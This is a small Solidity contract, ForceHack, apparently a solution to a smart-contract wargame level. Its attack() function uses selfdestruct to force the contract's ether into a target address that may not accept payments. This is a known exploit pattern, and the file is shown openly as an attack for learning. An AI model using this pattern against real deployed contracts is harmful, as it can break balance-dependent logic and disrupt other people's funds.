// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {
    constructor() payable {}

    // Receive function  called when msg.data is empty
    receive() external payable {}

    function attack(address payable target) external {
        selfdestruct(target);
    }
}


